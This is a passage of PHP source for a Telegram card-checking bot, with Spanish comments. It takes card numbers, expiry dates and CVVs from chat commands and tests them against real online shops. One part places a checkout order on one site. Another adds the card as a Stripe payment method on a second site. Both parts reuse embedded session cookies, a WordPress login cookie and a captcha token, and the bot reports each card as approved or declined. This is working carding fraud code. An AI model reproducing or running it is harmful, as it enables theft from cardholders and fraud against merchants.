illing_address_1=6195+bollinger+rd&billing_address_2=&billing_city=New+york&billing_state=AZ&billing_postcode=10010&billing_phone=4179204022&billing_email=Dausitherer%40cuvox.de&shipping_first_name=Carlos&shipping_last_name=Perez&shipping_company=&shipping_country=US&shipping_address_1=6195+bollinger+rd&shipping_address_2=&shipping_city=New+york&shipping_state=AZ&shipping_postcode=10010&order_comments=&shipping_method%5B0%5D=flexible_shipping_single%3A1&payment_method=mallpay_new&mallpay_new_card_number='.$cc.'&mallpay_new_clientIP=&cardpay_time_zone=-6&checkout_time=&mallpay_new_card_expiration_month='.$mes.'&mallpay_new_card_expiration_year='.$ano.'&mallpay_new_card_csc='.$cvv.'&woocommerce-process-checkout-nonce='.$nonce.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review',
  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-03%2022%3A27%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-03%2022%3A27%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; shop_display=grid; wp_woocommerce_session_f2a709978a8014e107f9b41c3a8cb8d0=t_1f5acb4a47a8ac88005a1faeb4784f%7C%7C1730845715%7C%7C1730842115%7C%7C833925d7f03cea5b340cba49703789e8; woocommerce_items_in_cart=1; woocommerce_cart_hash=6dcb71c95f2361b301b216aec27ec3d0; sbjs_session=pgs%3D18%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2Fcheckout%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'x-requested-with: XMLHttpRequest',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://www.naturexnauts.com',
    'referer: https://www.naturexnauts.com/checkout/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$link = $json["redirect"];
///EXTRAE EL MONTO///
$patron = '/orderAmount=(\d+\.\d+)/';
preg_match($patron, $response, $coincidencias);
//if (!empty($coincidencias)) {
    $monto = $coincidencias[1] . '$'; // Concatenamos el símbol>
//    echo $monto; // Salida: 39.99$
//} else {

//echo "$response\n\n";
$response1 = $response;
curl_close($curl);



////HACE LA COMPRA///
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => $link,
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-03%2022%3A27%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-03%2022%3A27%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; shop_display=grid; wp_woocommerce_session_f2a709978a8014e107f9b41c3a8cb8d0=t_1f5acb4a47a8ac88005a1faeb4784f%7C%7C1730845715%7C%7C1730842115%7C%7C833925d7f03cea5b340cba49703789e8; woocommerce_items_in_cart=1; woocommerce_cart_hash=6dcb71c95f2361b301b216aec27ec3d0; sbjs_session=pgs%3D18%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.naturexnauts.com%2Fcheckout%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'referer: https://www.naturexnauts.com/checkout/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
///EXTRE EL MENSAJE COMPLETO///
$patron = '/Payment Information: (.*)<\/li>/';
preg_match($patron, $response, $coincidencias);
$payment_info = $coincidencias[1];
///EXTRE EL MENSAGE CON CODIGOS///
$patron = '/:(.*)\,/';
preg_match($patron, $payment_info, $coincidencias);
$respo1 = trim($coincidencias[1]);
//Extrae el mensaje
$patron = '/[\d:|]/';
$respo = preg_replace($patron, '', $respo1);
curl_close($curl);

//echo "CODE: $respo - $monto\n";


///VERIFICA EL TINPO DE PROCESAMIENTO///
$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";

if (empty($respo)) {
        $respo = $response1;
}

// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
if (array_in_string($respo, $live_array)) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Shopify (".$monto.")\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Do Not Honor') !== false || strpos($respo, 'Your card was declined.') !== false || strpos($respo, 'Issuer Declined MCC') !== false || strpos($respo, 'Invalid card number') !== false || strpos($respo, 'Transaction refused') !== false) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Shopify (".$monto.")\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = False;
} else {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR  ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Shopify (".$monto.")\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
    $live = False;
}

if ($live) {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
} else {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();


}



elseif((strpos($message, "!wo") === 0)||(strpos($message, "/wo") === 0)||(strpos($message, ".wo") === 0)){
$lista = substr($message, 4);
$i = preg_split('/[|:| ]/', $lista);                                  
$cc    = $i[0];
$mes   = $i[1];
$ano  = trim(substr($i[2], -2));
$cvv   = $i[3];
$bin = substr($lista, 0, 6);                                        
$num = "$cc$mes$ano1$cvv";
//-----------------------------------------------------//
$longitud = 4;
$partes = [];
for ($i = 0; $i < strlen($cc); $i += $longitud) {
    $parte = substr($cc, $i, $longitud);
    $partes[] = $parte;                                               }


$verify = substr($cc, 16, 1);
        if($verify != ""){
                $respuesta = "🚫 Oops!\nUse this format: /wo CC|MM|YYYY|CVV\n";
        //        $respuesta = "🚫Invalid CC🚫\n";                                   
		sendMessage($chat_id,$respuesta, $message_id);
                die();
}

if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){

}else{
        $respuesta = "🚫 Oops!\nUse this format: /wo CC|MM|YYYY|CVV\n";
        sendMessage($chat_id,$respuesta, $message_id);
        die();
}
//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
        //----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.hollywoodexpendables.com/my-account/add-payment-method/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-29%2023%3A03%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-29%2023%3A03%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_3efb2a5bb3559a2902dbffae45726d30=Rigo%20Lopez%7C1734131115%7C2ThTCJdem39Q0CojYMabP972QLcBf5XZQW99FQW94Jl%7C4e607270a11ce05e4c67196a818ec170da73fb948d16d97cb1cad5dd2d9482a8; wfwaf-authcookie-91172c47aa3700744a7ba5a826d5c151=2594%7Cother%7Cread%7C864377e38d3dc49c482fe02981c9463d1d2789c7f826cc8de9b6a3cf0afd1495; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fpayment-methods%2F; __stripe_mid=e85ff5b4-223f-4a0c-81ce-39a3b619cf77aa581f; __stripe_sid=c612c1cf-7043-4033-a3a4-707d9a95ee86ae4b50',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'referer: https://www.hollywoodexpendables.com/my-account/payment-methods/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/createAndConfirmSetupIntentNonce":"([a-zA-Z0-9]+)"/';
preg_match($patron, $response, $coincidencias);
$nonce = $coincidencias[1];
curl_close($curl);


$cc = implode('+', $partes);

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&billing_details%5Baddress%5D%5Bpostal_code%5D=10080&billing_details%5Baddress%5D%5Bcountry%5D=US&payment_user_agent=stripe.js%2Fab4f93f420%3B+stripe-js-v3%2Fab4f93f420%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.hollywoodexpendables.com&time_on_page=18903&client_attribution_metadata%5Bclient_session_id%5D=008b43a2-a8b7-45f0-9b09-1890f4f8e465&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=95418e46-44e6-4c69-891e-21864d35f38732afd7&muid=e85ff5b4-223f-4a0c-81ce-39a3b619cf77aa581f&sid=c612c1cf-7043-4033-a3a4-707d9a95ee86ae4b50&key=pk_live_3aQeYWJrvX0nCYSR0VstU8rL&_stripe_version=2024-06-20&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5Ijoia01UbHQzK2wwTHBGWEFlZWRXd1lVNU1lNU84RGFPUVFhMFI3WUJxUDJ1Q2lvTXB0MEhXVEQvT3hZU05JVG1VOXhZelM3czh0aGl5ZVF0aXFrdHAzMVVoL1FmT1dUUFpkZkpya3ZwS1dVS2JmUUlQcGdIbjVFdmdSTFBZeVFMT1ZiaXRLMXlyYWtrbmM0d1c3MTA5MEdTK2sybzRkbkdaUm96SExBampxb3l3Und5ZGRpV0dHQWNlTzVqemVqYXFYRnpzS0ZQbGVFSVZvalVvYzM5ZFF2QUc5aHZ5ckdBOEVtNkhtemtTUTlCKzZFamNIN2RJUURDb05FM0o0V3ZVVEFiZU9Xb0VhZy9vNmM3clRBUDdNeWRRekcwN3V1Wk9EcWhqNHQxdENxa0xiQ290a2xXT1gxWjRpSTc0VnpzZmVMd2RJOUYzY2YvVy9hdDZVTll0dGRaNzVMUFdwb05UZTZVcllma2dkelF6cGZpa1A1ditVRGpOZk9CdTVCR050OUdVOVNrY1VCL3dySmJYR2tqWnE1YkdESTRrNzQ2TkpvYmx5ZS9RYThLM2JROVFsZ3paQzQzRE1DQVp5b0dyTkwxOEZCdHRKWVVFK2lleVR4QTVyNkIxZFgzUnlva0JYRms0ak9zcm4vdHM1b3JMOEdhazZad09LQ3RWcHlHWFVFTUJRZlNPTzNmZnM1UEY5RG05R1ZjVXo5VllLUEp5SVRxNjB5WXlmSyt4RjFwWkVwb3RyTDMwVmYrcFZyN3BuWGw1R0R3YTlES1BaS2Z1aWR4cEsycHh4MXgxMGVjMVRPdEV3NmhPMHpIeVlqUFJsL282a0sxOGJYbUsyZmRGbkY0eUc3NVZEQlp5OWFkTzJnSzF5akxHZzhNYml6WUI4bFhFY09NNjA0YUhSc0hHVmRjQnQ4T283dDFXL0Q0cjdpbXJja08zam41andBdW9uTE1TMTVmUlBYbzhISVRUbFkwSkFVSFlPUzZiditXVWFBU1VyY0VHcHpIbVlDSnpYd3RqdXRpc0hnb0ZVTEpuUGJReDE3M3BEcy8wQUxERVZoNEc1MkRmN1FRUGp5S1F0WXBhTjFkcFgxRDZSRnluWVZvLzVqVHBMYUs3U1lmdkxSN1QyeTFWaWJjOFBhODVJMGg5RklXbVloVkk2cW5qSzF6emJPY2YyK3BsUjFsOTdSRjM5dnR3VDh1Q2ducDZvN1lDYUVDK3V4b1lLRzIvcDF1NkR0NXY1V3UwWGdFeU9GeityMVBPRkloOUtDdXVIK3VCRlBVaVhINUJpZ2c5cjlZL2hFclBzbFc3SnNpU3BhMjNiOGlPdFN2dXlNZVEwTEsvc2hPQVFRQkc5aVA0MnJXc0Q5dVJCR0xYd1FFUmRJRzBxOEpUQlgzSGZLWXlxREYweHRtbnpDVjR0TU1IQ09BRnNsVENaRFJZTmZQSjJnTndaZ2ZUMzhhamZnN0hETnFQQW9ndHljaFZ5aDFTTGh3QmhrQ2V0eFp1UXdwMlBvZXZXOEV5V244WHhiZFhFUU1JN3RjOGtwd3JzWW5jN2dWdHVOZEpaQmRDVGJjWFZMSjZpbVhGa28xSzRVTVozcFdqZ3dmcGJlbHhhWnI1VDJhVUs4Z29MUHc0MHZFRVVaRGtPL002T0h4aitTdHpEOVBUVWhSei9BMWo5R2pVQ255YnphOTQrdElzNkd1eU54T3pVbWlyZ3plM3haL3BEOW9qTGRZSmgvWGx2TGtISk4xWXU3RXRjNnFhVDVCOTZ2dFBEa1FQcC8yZS9LVWMreDFsUjVCbUNpY3h4WnExL3B0VnRIL21mZmJLVStCUGg4R1cybHlIYUI5dGNhQUFvU2l1U3hMWVJTdEt6VjlreUFUeDUrTVFncmx1YkVtTG5GYnlkTEE4ejNaVXpjRlJhclVJNkNGMEE0eDhtaGxRa3ZaOE1mMWZiWkFFOVl4Mm0yS1plMmtyNHJDOXBOS2l5NTZuOW40cm0zUSthSC9kQUZSQll1eHFpcW5Lb3hLRUR3ZWVvM3dYZVRGZm1pMjRhbDk5YnRWajViZXNvR2d4SHYzdG9zWUNsQmlsR0x0bURSK3JKL2VBNGdxdTVQSDZGYkVGcW1ka1FVRHFiT0dzRW5NMG42ZUcrNGFJaVZtdnMyV2JtS1M3UkJ4NGthb0huWEhoaHhqcFNhUGdLcUlObFViM3l6L2pIUFhvT2N5VkJ6QUFBWk9hNE16TURzMkdtL1VES0Y1RlY0bWQ2aHUwN1BzZnV0QVZUVDhJcVBKMlRJb2IzcU4zTTBHR3MrU0ZrMks5cFcrSENZVGw3Z0wrMDVKN1Z6WHVZOUZ6RDE5cXNFd0puc0FPRW9jRktFRnZDRmZGeFB3VUlQMDZSaGRpdzdhM09TdUUwbVd5RlVoWXRlWWwzUXBEUllvNzhFK1poQVBjTDkzUHFrMDhSUG9tdnNyQ2xic1hXbWc1MmxlK05UQXpoblVkSkRWRVdrTHFvVDVUSG0yangyK05SYndhSUNadzRNUVhtQWREYnVMMXVzc2wzYXlEalhJcCtWSDhlRkdnbk4yTmJYWEhCQkhXWExheUU1a1hVVEQyTEUvcHpBbDJuNno4TVQrSGlJSWhhMmtvK0wzeDlZNUNuRGMxa1FtN2ZpUTVTL25DeXllODE1eFlNRXhaVmhHZmJ1RFlKQ3V5Y0dXdUlnbDJBamt2cnJETzdYYUNqY04vQlRiWW1MTjFZY0FYV09pTXozbXFONjc2UzFyVE04a1liV0pSMitLbEk3QVlGSHkyeDFFREppUUhuVnprQ0FzTHZhK0lqV3IxQzV2RjZsQjZCemw1REtRZz0iLCJleHAiOjE3MzI5MjE2NzMsInNoYXJkX2lkIjoyMjE5OTYwNzMsImtyIjoiMWQ5Yjk2ODAiLCJwZCI6MCwiY2RhdGEiOiJXMEt3TjBuajJHeVhaR05VVW9oSXQ5OHRhaXpObkgvUEpRREY4cXFtWEl0aDEyQ0tINUhZMjFBQWZHWUpsSy9qa0JScWx1cjVHSGJNcFB5Nkpna0FaQk5leVF4U1U0RWhXQVhZaC9VSWNDaHpwZlpDUE9VdHVFdUhkbTg0WEtuR0UwbE9mSVZQRXQ3NlhhZ0pGNGdnb1JTTDZlRnJIMlk4VkJiTHh3WEorclVGaC9lMzRBUS9WSGZKa29yTkU3SFpTYi9XMWVZaXZXZVhyL3FKIn0.AidX1i7r-8V-dch752wixFQBUYHpae7vXp5Y9armNnc',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'Accept: application/json',
    'Content-Type: application/x-www-form-urlencoded',
    'accept-language: es-US,es;q=0.9',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$id = $json['id'];
curl_close($curl);


$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.hollywoodexpendables.com?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'action=create_and_confirm_setup_intent&wc-stripe-payment-method='.$id.'&wc-stripe-payment-type=card&_ajax_nonce='.$nonce.'',
  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-29%2023%3A03%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-29%2023%3A03%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_3efb2a5bb3559a2902dbffae45726d30=Rigo%20Lopez%7C1734131115%7C2ThTCJdem39Q0CojYMabP972QLcBf5XZQW99FQW94Jl%7C4e607270a11ce05e4c67196a818ec170da73fb948d16d97cb1cad5dd2d9482a8; wfwaf-authcookie-91172c47aa3700744a7ba5a826d5c151=2594%7Cother%7Cread%7C864377e38d3dc49c482fe02981c9463d1d2789c7f826cc8de9b6a3cf0afd1495; __stripe_mid=e85ff5b4-223f-4a0c-81ce-39a3b619cf77aa581f; __stripe_sid=c612c1cf-7043-4033-a3a4-707d9a95ee86ae4b50; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'x-requested-with: XMLHttpRequest',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://www.hollywoodexpendables.com',
    'referer: https://www.hollywoodexpendables.com/my-account/add-payment-method/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$message = str_replace("Error: ", "", $json['data']['error']['message']);
$success = $json['success'];
$status = $json['data']['status'];
curl_close($curl);

if ($success === true && $status === "succeeded") {
    $respo = "1000: Approved!";

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.hollywoodexpendables.com/my-account/payment-methods/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'wordpress_logged_in_3efb2a5bb3559a2902dbffae45726d30=Rigo%20Lopez%7C1734131115%7C2ThTCJdem39Q0CojYMabP972QLcBf5XZQW99FQW94Jl%7C4e607270a11ce05e4c67196a818ec170da73fb948d16d97cb1cad5dd2d9482a8; __stripe_mid=e85ff5b4-223f-4a0c-81ce-39a3b619cf77aa581f; wfwaf-authcookie-91172c47aa3700744a7ba5a826d5c151=2594%7Cother%7Cread%7Ce3130a0c99e501a87dca9f9fb17be96eaa3653a392f210f689c542dffcf2df01; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-30%2018%3A05%3A07%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-11-30%2018%3A05%3A07%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.hollywoodexpendables.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; 